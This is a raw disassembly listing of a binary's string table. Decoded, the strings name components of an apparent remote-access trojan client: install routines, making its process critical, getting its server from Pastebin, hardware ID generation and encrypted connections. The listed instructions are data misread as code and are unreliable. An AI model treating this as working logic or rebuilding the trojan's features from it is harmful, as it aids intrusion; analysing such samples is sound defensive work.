  408692:	00 73 74             	add    %dh,0x74(%ebx)
  408695:	72 56                	jb     0x4086ed
  408697:	61                   	popa
  408698:	6c                   	insb   (%dx),%es:(%edi)
  408699:	00 52 74             	add    %dl,0x74(%edx)
  40869c:	6c                   	insb   (%dx),%es:(%edi)
  40869d:	53                   	push   %ebx
  40869e:	65 74 50             	gs je  0x4086f1
  4086a1:	72 6f                	jb     0x408712
  4086a3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086a6:	73 49                	jae    0x4086f1
  4086a8:	73 43                	jae    0x4086ed
  4086aa:	72 69                	jb     0x408715
  4086ac:	74 69                	je     0x408717
  4086ae:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086b1:	00 50 72             	add    %dl,0x72(%eax)
  4086b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086b8:	73 43                	jae    0x4086fd
  4086ba:	72 69                	jb     0x408725
  4086bc:	74 69                	je     0x408727
  4086be:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086c1:	00 4e 65             	add    %cl,0x65(%esi)
  4086c4:	74 77                	je     0x40873d
  4086c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4086c7:	72 6b                	jb     0x408734
  4086c9:	43                   	inc    %ebx
  4086ca:	72 65                	jb     0x408731
  4086cc:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086cf:	74 69                	je     0x40873a
  4086d1:	61                   	popa
  4086d2:	6c                   	insb   (%dx),%es:(%edi)
  4086d3:	00 53 79             	add    %dl,0x79(%ebx)
  4086d6:	73 74                	jae    0x40874c
  4086d8:	65 6d                	gs insl (%dx),%es:(%edi)
  4086da:	2e 53                	cs push %ebx
  4086dc:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086e0:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4086e7:	6e 
  4086e8:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086eb:	61                   	popa
  4086ec:	6c                   	insb   (%dx),%es:(%edi)
  4086ed:	00 57 69             	add    %dl,0x69(%edi)
  4086f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f1:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086f3:	77 73                	ja     0x408768
  4086f5:	50                   	push   %eax
  4086f6:	72 69                	jb     0x408761
  4086f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f9:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086fc:	61                   	popa
  4086fd:	6c                   	insb   (%dx),%es:(%edi)
  4086fe:	00 41 72             	add    %al,0x72(%ecx)
  408701:	65 45                	gs inc %ebp
  408703:	71 75                	jno    0x40877a
  408705:	61                   	popa
  408706:	6c                   	insb   (%dx),%es:(%edi)
  408707:	00 67 65             	add    %ah,0x65(%edi)
  40870a:	74 5f                	je     0x40876b
  40870c:	49                   	dec    %ecx
  40870d:	6e                   	outsb  %ds:(%esi),(%dx)
  40870e:	74 65                	je     0x408775
  408710:	72 76                	jb     0x408788
  408712:	61                   	popa
  408713:	6c                   	insb   (%dx),%es:(%edi)
  408714:	00 73 65             	add    %dh,0x65(%ebx)
  408717:	74 5f                	je     0x408778
  408719:	49                   	dec    %ecx
  40871a:	6e                   	outsb  %ds:(%esi),(%dx)
  40871b:	74 65                	je     0x408782
  40871d:	72 76                	jb     0x408795
  40871f:	61                   	popa
  408720:	6c                   	insb   (%dx),%es:(%edi)
  408721:	00 43 6c             	add    %al,0x6c(%ebx)
  408724:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  40872b:	73 74                	jae    0x4087a1
  40872d:	61                   	popa
  40872e:	6c                   	insb   (%dx),%es:(%edi)
  40872f:	6c                   	insb   (%dx),%es:(%edi)
  408730:	00 6b 65             	add    %ch,0x65(%ebx)
  408733:	72 6e                	jb     0x4087a3
  408735:	65 6c                	gs insb (%dx),%es:(%edi)
  408737:	33 32                	xor    (%edx),%esi
  408739:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40873c:	6c                   	insb   (%dx),%es:(%edi)
  40873d:	00 75 73             	add    %dh,0x73(%ebp)
  408740:	65 72 33             	gs jb  0x408776
  408743:	32 2e                	xor    (%esi),%ch
  408745:	64 6c                	fs insb (%dx),%es:(%edi)
  408747:	6c                   	insb   (%dx),%es:(%edi)
  408748:	00 6e 74             	add    %ch,0x74(%esi)
  40874b:	64 6c                	fs insb (%dx),%es:(%edi)
  40874d:	6c                   	insb   (%dx),%es:(%edi)
  40874e:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408751:	6c                   	insb   (%dx),%es:(%edi)
  408752:	00 4b 69             	add    %cl,0x69(%ebx)
  408755:	6c                   	insb   (%dx),%es:(%edi)
  408756:	6c                   	insb   (%dx),%es:(%edi)
  408757:	00 50 6f             	add    %dl,0x6f(%eax)
  40875a:	6c                   	insb   (%dx),%es:(%edi)
  40875b:	6c                   	insb   (%dx),%es:(%edi)
  40875c:	00 57 72             	add    %dl,0x72(%edi)
  40875f:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  408766:	00 
  408767:	53                   	push   %ebx
  408768:	65 74 41             	gs je  0x4087ac
  40876b:	73 4e                	jae    0x4087bb
  40876d:	75 6c                	jne    0x4087db
  40876f:	6c                   	insb   (%dx),%es:(%edi)
  408770:	00 4d 75             	add    %cl,0x75(%ebp)
  408773:	74 65                	je     0x4087da
  408775:	78 43                	js     0x4087ba
  408777:	6f                   	outsl  %ds:(%esi),(%dx)
  408778:	6e                   	outsb  %ds:(%esi),(%dx)
  408779:	74 72                	je     0x4087ed
  40877b:	6f                   	outsl  %ds:(%esi),(%dx)
  40877c:	6c                   	insb   (%dx),%es:(%edi)
  40877d:	00 45 6e             	add    %al,0x6e(%ebp)
  408780:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408783:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  408787:	72 65                	jb     0x4087ee
  408789:	61                   	popa
  40878a:	6d                   	insl   (%dx),%es:(%edi)
  40878b:	00 46 69             	add    %al,0x69(%esi)
  40878e:	6c                   	insb   (%dx),%es:(%edi)
  40878f:	65 53                	gs push %ebx
  408791:	74 72                	je     0x408805
  408793:	65 61                	gs popa
  408795:	6d                   	insl   (%dx),%es:(%edi)
  408796:	00 4e 65             	add    %cl,0x65(%esi)
  408799:	74 77                	je     0x408812
  40879b:	6f                   	outsl  %ds:(%esi),(%dx)
  40879c:	72 6b                	jb     0x408809
  40879e:	53                   	push   %ebx
  40879f:	74 72                	je     0x408813
  4087a1:	65 61                	gs popa
  4087a3:	6d                   	insl   (%dx),%es:(%edi)
  4087a4:	00 53 73             	add    %dl,0x73(%ebx)
  4087a7:	6c                   	insb   (%dx),%es:(%edi)
  4087a8:	53                   	push   %ebx
  4087a9:	74 72                	je     0x40881d
  4087ab:	65 61                	gs popa
  4087ad:	6d                   	insl   (%dx),%es:(%edi)
  4087ae:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b3:	64 65 46             	fs gs inc %esi
  4087b6:	72 6f                	jb     0x408827
  4087b8:	6d                   	insl   (%dx),%es:(%edi)
  4087b9:	53                   	push   %ebx
  4087ba:	74 72                	je     0x40882e
  4087bc:	65 61                	gs popa
  4087be:	6d                   	insl   (%dx),%es:(%edi)
  4087bf:	00 43 72             	add    %al,0x72(%ebx)
  4087c2:	79 70                	jns    0x408834
  4087c4:	74 6f                	je     0x408835
  4087c6:	53                   	push   %ebx
  4087c7:	74 72                	je     0x40883b
  4087c9:	65 61                	gs popa
  4087cb:	6d                   	insl   (%dx),%es:(%edi)
  4087cc:	00 47 5a             	add    %al,0x5a(%edi)
  4087cf:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087d6:	6d                   	insl   (%dx),%es:(%edi)
  4087d7:	00 4d 65             	add    %cl,0x65(%ebp)
  4087da:	6d                   	insl   (%dx),%es:(%edi)
  4087db:	6f                   	outsl  %ds:(%esi),(%dx)
  4087dc:	72 79                	jb     0x408857
  4087de:	53                   	push   %ebx
  4087df:	74 72                	je     0x408853
  4087e1:	65 61                	gs popa
  4087e3:	6d                   	insl   (%dx),%es:(%edi)
  4087e4:	00 50 72             	add    %dl,0x72(%eax)
  4087e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e8:	67 72 61             	addr16 jb 0x40884c
  4087eb:	6d                   	insl   (%dx),%es:(%edi)
  4087ec:	00 67 65             	add    %ah,0x65(%edi)
  4087ef:	74 5f                	je     0x408850
  4087f1:	49                   	dec    %ecx
  4087f2:	74 65                	je     0x408859
  4087f4:	6d                   	insl   (%dx),%es:(%edi)
  4087f5:	00 67 65             	add    %ah,0x65(%edi)
  4087f8:	74 5f                	je     0x408859
  4087fa:	49                   	dec    %ecx
  4087fb:	73 36                	jae    0x408833
  4087fd:	34 42                	xor    $0x42,%al
  4087ff:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408806:	74 
  408807:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  40880e:	65 6d                	gs insl (%dx),%es:(%edi)
  408810:	00 43 6c             	add    %al,0x6c(%ebx)
  408813:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  40881a:	67 6f                	outsl  %ds:(%si),(%dx)
  40881c:	72 69                	jb     0x408887
  40881e:	74 68                	je     0x408888
  408820:	6d                   	insl   (%dx),%es:(%edi)
  408821:	00 53 79             	add    %dl,0x79(%ebx)
  408824:	6d                   	insl   (%dx),%es:(%edi)
  408825:	6d                   	insl   (%dx),%es:(%edi)
  408826:	65 74 72             	gs je  0x40889b
  408829:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408830:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  408837:	79 
  408838:	6d                   	insl   (%dx),%es:(%edi)
  408839:	6d                   	insl   (%dx),%es:(%edi)
  40883a:	65 74 72             	gs je  0x4088af
  40883d:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408844:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  40884b:	73 
  40884c:	68 41 6c 67 6f       	push   $0x6f676c41
  408851:	72 69                	jb     0x4088bc
  408853:	74 68                	je     0x4088bd
  408855:	6d                   	insl   (%dx),%es:(%edi)
  408856:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  40885a:	6d                   	insl   (%dx),%es:(%edi)
  40885b:	00 52 61             	add    %dl,0x61(%edx)
  40885e:	6e                   	outsb  %ds:(%esi),(%dx)
  40885f:	64 6f                	outsl  %fs:(%esi),(%dx)
  408861:	6d                   	insl   (%dx),%es:(%edi)
  408862:	00 49 43             	add    %cl,0x43(%ecx)
  408865:	72 79                	jb     0x4088e0
  408867:	70 74                	jo     0x4088dd
  408869:	6f                   	outsl  %ds:(%esi),(%dx)
  40886a:	54                   	push   %esp
  40886b:	72 61                	jb     0x4088ce
  40886d:	6e                   	outsb  %ds:(%esi),(%dx)
  40886e:	73 66                	jae    0x4088d6
  408870:	6f                   	outsl  %ds:(%esi),(%dx)
  408871:	72 6d                	jb     0x4088e0
  408873:	00 4d 73             	add    %cl,0x73(%ebp)
  408876:	67 50                	addr16 push %eax
  408878:	61                   	popa
  408879:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  40887c:	6e                   	outsb  %ds:(%esi),(%dx)
  40887d:	75 6d                	jne    0x4088ec
  40887f:	00 57 72             	add    %dl,0x72(%edi)
  408882:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  408889:	65 
  40888a:	61                   	popa
  40888b:	6e                   	outsb  %ds:(%esi),(%dx)
  40888c:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408890:	6f                   	outsl  %ds:(%esi),(%dx)
  408891:	6f                   	outsl  %ds:(%esi),(%dx)
  408892:	6c                   	insb   (%dx),%es:(%edi)
  408893:	65 61                	gs popa
  408895:	6e                   	outsb  %ds:(%esi),(%dx)
  408896:	00 53 65             	add    %dl,0x65(%ebx)
  408899:	74 41                	je     0x4088dc
  40889b:	73 42                	jae    0x4088df
  40889d:	6f                   	outsl  %ds:(%esi),(%dx)
  40889e:	6f                   	outsl  %ds:(%esi),(%dx)
  40889f:	6c                   	insb   (%dx),%es:(%edi)
  4088a0:	65 61                	gs popa
  4088a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a3:	00 48 77             	add    %cl,0x77(%eax)
  4088a6:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088ad:	65 
  4088ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4088af:	00 63 68             	add    %ah,0x68(%ebx)
  4088b2:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088b9:	4d 
  4088ba:	61                   	popa
  4088bb:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088c2:	43                   	inc    %ebx
  4088c3:	68 61 69 6e 00       	push   $0x6e6961
  4088c8:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088cb:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d3:	6d                   	insl   (%dx),%es:(%edi)
  4088d4:	61                   	popa
  4088d5:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088dc:	43                   	inc    %ebx
  4088dd:	75 72                	jne    0x408951
  4088df:	72 65                	jb     0x408946
  4088e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e2:	74 44                	je     0x408928
  4088e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e5:	6d                   	insl   (%dx),%es:(%edi)
  4088e6:	61                   	popa
  4088e7:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4088ee:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4088f2:	00 49 73             	add    %cl,0x73(%ecx)
  4088f5:	41                   	inc    %ecx
  4088f6:	64 6d                	fs insl (%dx),%es:(%edi)
  4088f8:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  4088ff:	00 47 65             	add    %al,0x65(%edi)
  408902:	74 46                	je     0x40894a
  408904:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40890b:	57 
  40890c:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408913:	78 
  408914:	74 65                	je     0x40897b
  408916:	6e                   	outsb  %ds:(%esi),(%dx)
  408917:	73 69                	jae    0x408982
  408919:	6f                   	outsl  %ds:(%esi),(%dx)
  40891a:	6e                   	outsb  %ds:(%esi),(%dx)
  40891b:	00 67 65             	add    %ah,0x65(%edi)
  40891e:	74 5f                	je     0x40897f
  408920:	4f                   	dec    %edi
  408921:	53                   	push   %ebx
  408922:	56                   	push   %esi
  408923:	65 72 73             	gs jb  0x408999
  408926:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40892d:	74 65                	je     0x408994
  40892f:	6d                   	insl   (%dx),%es:(%edi)
  408930:	2e 49                	cs dec %ecx
  408932:	4f                   	dec    %edi
  408933:	2e 43                	cs inc %ebx
  408935:	6f                   	outsl  %ds:(%esi),(%dx)
  408936:	6d                   	insl   (%dx),%es:(%edi)
  408937:	70 72                	jo     0x4089ab
  408939:	65 73 73             	gs jae 0x4089af
  40893c:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408943:	6c                   	insb   (%dx),%es:(%edi)
  408944:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40894b:	00 53 79             	add    %dl,0x79(%ebx)
  40894e:	73 74                	jae    0x4089c4
  408950:	65 6d                	gs insl (%dx),%es:(%edi)
  408952:	2e 53                	cs push %ebx
  408954:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408958:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  40895f:	68 
  408960:	65 6e                	outsb  %gs:(%esi),(%dx)
  408962:	74 69                	je     0x4089cd
  408964:	63 61 74             	arpl   %esp,0x74(%ecx)
  408967:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40896e:	74 65                	je     0x4089d5
  408970:	6d                   	insl   (%dx),%es:(%edi)
  408971:	2e 52                	cs push %edx
  408973:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408976:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40897b:	6e                   	outsb  %ds:(%esi),(%dx)
  40897c:	00 58 35             	add    %bl,0x35(%eax)
  40897f:	30 39                	xor    %bh,(%ecx)
  408981:	43                   	inc    %ebx
  408982:	65 72 74             	gs jb  0x4089f9
  408985:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40898c:	43                   	inc    %ebx
  40898d:	6f                   	outsl  %ds:(%esi),(%dx)
  40898e:	6c                   	insb   (%dx),%es:(%edi)
  40898f:	6c                   	insb   (%dx),%es:(%edi)
  408990:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408995:	6e                   	outsb  %ds:(%esi),(%dx)
  408996:	00 4d 61             	add    %cl,0x61(%ebp)
  408999:	6e                   	outsb  %ds:(%esi),(%dx)
  40899a:	61                   	popa
  40899b:	67 65 6d             	gs insl (%dx),%es:(%di)
  40899e:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089a0:	74 4f                	je     0x4089f1
  4089a2:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089a5:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089a9:	6c                   	insb   (%dx),%es:(%edi)
  4089aa:	6c                   	insb   (%dx),%es:(%edi)
  4089ab:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b1:	00 43 6c             	add    %al,0x6c(%ebx)
  4089b4:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4089bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4089bd:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c3:	00 73 65             	add    %dh,0x65(%ebx)
  4089c6:	74 5f                	je     0x408a27
  4089c8:	50                   	push   %eax
  4089c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ca:	73 69                	jae    0x408a35
  4089cc:	74 69                	je     0x408a37
  4089ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4089cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d0:	00 70 6f             	add    %dh,0x6f(%eax)
  4089d3:	73 69                	jae    0x408a3e
  4089d5:	74 69                	je     0x408a40
  4089d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d9:	00 43 72             	add    %al,0x72(%ebx)
  4089dc:	79 70                	jns    0x408a4e
  4089de:	74 6f                	je     0x408a4f
  4089e0:	67 72 61             	addr16 jb 0x408a44
  4089e3:	70 68                	jo     0x408a4d
  4089e5:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4089ec:	74 69                	je     0x408a57
  4089ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4089f0:	00 41 72             	add    %al,0x72(%ecx)
  4089f3:	67 75 6d             	addr16 jne 0x408a63
  4089f6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089f8:	74 4e                	je     0x408a48
  4089fa:	75 6c                	jne    0x408a68
  4089fc:	6c                   	insb   (%dx),%es:(%edi)
  4089fd:	45                   	inc    %ebp
  4089fe:	78 63                	js     0x408a63
  408a00:	65 70 74             	gs jo  0x408a77
  408a03:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a0a:	75 6d                	jne    0x408a79
  408a0c:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a0e:	74 45                	je     0x408a55
  408a10:	78 63                	js     0x408a75
  408a12:	65 70 74             	gs jo  0x408a89
  408a15:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a1c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a1d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a1e:	77 6e                	ja     0x408a8e
  408a20:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a23:	61                   	popa
  408a24:	67 65 43             	addr16 gs inc %ebx
  408a27:	6f                   	outsl  %ds:(%esi),(%dx)
  408a28:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a2d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a2f:	00 53 65             	add    %dl,0x65(%ebx)
  408a32:	6e                   	outsb  %ds:(%esi),(%dx)
  408a33:	64 49                	fs dec %ecx
  408a35:	6e                   	outsb  %ds:(%esi),(%dx)
  408a36:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a38:	00 46 69             	add    %al,0x69(%esi)
  408a3b:	6c                   	insb   (%dx),%es:(%edi)
  408a3c:	65 49                	gs dec %ecx
  408a3e:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a41:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a45:	76 65                	jbe    0x408aac
  408a47:	49                   	dec    %ecx
  408a48:	6e                   	outsb  %ds:(%esi),(%dx)
  408a49:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a4b:	00 46 69             	add    %al,0x69(%esi)
  408a4e:	6c                   	insb   (%dx),%es:(%edi)
  408a4f:	65 53                	gs push %ebx
  408a51:	79 73                	jns    0x408ac6
  408a53:	74 65                	je     0x408aba
  408a55:	6d                   	insl   (%dx),%es:(%edi)
  408a56:	49                   	dec    %ecx
  408a57:	6e                   	outsb  %ds:(%esi),(%dx)
  408a58:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a5a:	00 43 6f             	add    %al,0x6f(%ebx)
  408a5d:	6d                   	insl   (%dx),%es:(%edi)
  408a5e:	70 75                	jo     0x408ad5
  408a60:	74 65                	je     0x408ac7
  408a62:	72 49                	jb     0x408aad
  408a64:	6e                   	outsb  %ds:(%esi),(%dx)
  408a65:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a67:	00 43 53             	add    %al,0x53(%ebx)
  408a6a:	68 61 72 70 41       	push   $0x41707261
  408a6f:	72 67                	jb     0x408ad8
  408a71:	75 6d                	jne    0x408ae0
  408a73:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a75:	74 49                	je     0x408ac0
  408a77:	6e                   	outsb  %ds:(%esi),(%dx)
  408a78:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a7a:	00 50 72             	add    %dl,0x72(%eax)
  408a7d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a7e:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a81:	73 53                	jae    0x408ad6
  408a83:	74 61                	je     0x408ae6
  408a85:	72 74                	jb     0x408afb
  408a87:	49                   	dec    %ecx
  408a88:	6e                   	outsb  %ds:(%esi),(%dx)
  408a89:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a8b:	00 57 72             	add    %dl,0x72(%edi)
  408a8e:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408a95:	50 
  408a96:	72 65                	jb     0x408afd
  408a98:	76 65                	jbe    0x408aff
  408a9a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a9b:	74 53                	je     0x408af0
  408a9d:	6c                   	insb   (%dx),%es:(%edi)
  408a9e:	65 65 70 00          	gs gs jo 0x408aa2
  408aa2:	5a                   	pop    %edx
  408aa3:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408aaa:	65 6e                	outsb  %gs:(%esi),(%dx)
  408aac:	74 41                	je     0x408aef
  408aae:	70 70                	jo     0x408b20
  408ab0:	00 4d 69             	add    %cl,0x69(%ebp)
  408ab3:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408ab6:	73 6f                	jae    0x408b27
  408ab8:	66 74 2e             	data16 je 0x408ae9
  408abb:	43                   	inc    %ebx
  408abc:	53                   	push   %ebx
  408abd:	68 61 72 70 00       	push   $0x707261
  408ac2:	47                   	inc    %edi
  408ac3:	72 6f                	jb     0x408b34
  408ac5:	75 70                	jne    0x408b37
  408ac7:	00 4e 6f             	add    %cl,0x6f(%esi)
  408aca:	72 6d                	jb     0x408b39
  408acc:	61                   	popa
  408acd:	6c                   	insb   (%dx),%es:(%edi)
  408ace:	53                   	push   %ebx
  408acf:	74 61                	je     0x408b32
  408ad1:	72 74                	jb     0x408b47
  408ad3:	75 70                	jne    0x408b45
  408ad5:	00 53 79             	add    %dl,0x79(%ebx)
  408ad8:	73 74                	jae    0x408b4e
  408ada:	65 6d                	gs insl (%dx),%es:(%edi)
  408adc:	2e 4c                	cs dec %esp
  408ade:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408ae5:	61                   	popa
  408ae6:	72 00                	jb     0x408ae8
  408ae8:	43                   	inc    %ebx
  408ae9:	68 61 72 00 49       	push   $0x49007261
  408aee:	6e                   	outsb  %ds:(%esi),(%dx)
  408aef:	76 6f                	jbe    0x408b60
  408af1:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408af5:	6d                   	insl   (%dx),%es:(%edi)
  408af6:	62 65 72             	bound  %esp,0x72(%ebp)
  408af9:	00 4d 44             	add    %cl,0x44(%ebp)
  408afc:	35 43 72 79 70       	xor    $0x70797243,%eax
  408b01:	74 6f                	je     0x408b72
  408b03:	53                   	push   %ebx
  408b04:	65 72 76             	gs jb  0x408b7d
  408b07:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b0e:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b15:	41 
  408b16:	43                   	inc    %ebx
  408b17:	72 79                	jb     0x408b92
  408b19:	70 74                	jo     0x408b8f
  408b1b:	6f                   	outsl  %ds:(%esi),(%dx)
  408b1c:	53                   	push   %ebx
  408b1d:	65 72 76             	gs jb  0x408b96
  408b20:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b27:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b2e:	73 
  408b2f:	43                   	inc    %ebx
  408b30:	72 79                	jb     0x408bab
  408b32:	70 74                	jo     0x408ba8
  408b34:	6f                   	outsl  %ds:(%esi),(%dx)
  408b35:	53                   	push   %ebx
  408b36:	65 72 76             	gs jb  0x408baf
  408b39:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b40:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b47:	72 
  408b48:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b4f:	64 65 72 00          	fs gs jb 0x408b53
  408b53:	49                   	dec    %ecx
  408b54:	6e                   	outsb  %ds:(%esi),(%dx)
  408b55:	73 74                	jae    0x408bcb
  408b57:	61                   	popa
  408b58:	6c                   	insb   (%dx),%es:(%edi)
  408b59:	6c                   	insb   (%dx),%es:(%edi)
  408b5a:	46                   	inc    %esi
  408b5b:	6f                   	outsl  %ds:(%esi),(%dx)
  408b5c:	6c                   	insb   (%dx),%es:(%edi)
  408b5d:	64 65 72 00          	fs gs jb 0x408b61
  408b61:	49                   	dec    %ecx
  408b62:	64 53                	fs push %ebx
  408b64:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b66:	64 65 72 00          	fs gs jb 0x408b6a
  408b6a:	73 65                	jae    0x408bd1
  408b6c:	6e                   	outsb  %ds:(%esi),(%dx)
  408b6d:	64 65 72 00          	fs gs jb 0x408b71
  408b71:	4d                   	dec    %ebp
  408b72:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b79:	74 2e                	je     0x408ba9
  408b7b:	43                   	inc    %ebx
  408b7c:	53                   	push   %ebx
  408b7d:	68 61 72 70 2e       	push   $0x2e707261
  408b82:	52                   	push   %edx
  408b83:	75 6e                	jne    0x408bf3
  408b85:	74 69                	je     0x408bf0
  408b87:	6d                   	insl   (%dx),%es:(%edi)
  408b88:	65 42                	gs inc %edx
  408b8a:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408b91:	61                   	popa
  408b92:	6c                   	insb   (%dx),%es:(%edi)
  408b93:	6c                   	insb   (%dx),%es:(%edi)
  408b94:	53                   	push   %ebx
  408b95:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408b9c:	65 
  408b9d:	72 00                	jb     0x408b9f
  408b9f:	47                   	inc    %edi
  408ba0:	65 74 45             	gs je  0x408be8
